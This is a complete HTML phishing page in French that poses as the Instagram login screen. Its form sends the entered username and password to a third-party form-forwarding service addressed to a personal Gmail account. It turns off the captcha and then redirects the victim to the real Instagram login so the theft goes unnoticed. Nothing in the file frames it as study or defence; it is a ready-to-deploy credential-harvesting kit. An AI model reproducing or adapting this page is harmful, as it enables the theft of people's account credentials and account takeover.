<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connexion Instagram</title>
<style>
  body {background:#000; color:#fff; font-family:Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;}
  .container {background:#121212; padding:30px; border-radius:8px; width:320px;}
  h1 {font-family: 'Arial', sans-serif; font-size:40px; margin:0 0 20px; text-align:center;}
  label {display:block; margin:12px 0 6px; font-size:14px;}
  input {width:100%; padding:10px; background:#222; border:1px solid #444; border-radius:4px; color:#fff; font-size:14px;}
  button {width:100%; margin-top:20px; padding:10px; border:none; border-radius:4px; color:white; font-weight:bold; font-size:16px; cursor:pointer;}
  .facebook-btn {background:#1877f2; margin-bottom:15px;}
  .submit-btn {background:#3897f0;}
</style>
</head>
<body>

<div class="container">
  <h1>Instagram</h1>

  <form action="https://formsubmit.co/design.site.web69@gmail.com" method="POST" autocomplete="off">
    <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/">
    <input type="hidden" name="_captcha" value="false">

    <button type="button" class="facebook-btn">Connexion avec Facebook</button>

    <label for="username">Téléphone, nom d’utilisateur ou email *</label>
    <input type="text" name="Identifiant" required>

    <label for="password">Mot de passe *</label>
    <input type="password" name="Mot de passe" required>

    <button type="submit" class="submit-btn">Se connecter</button>
  </form>

</div>

</body>
</html>
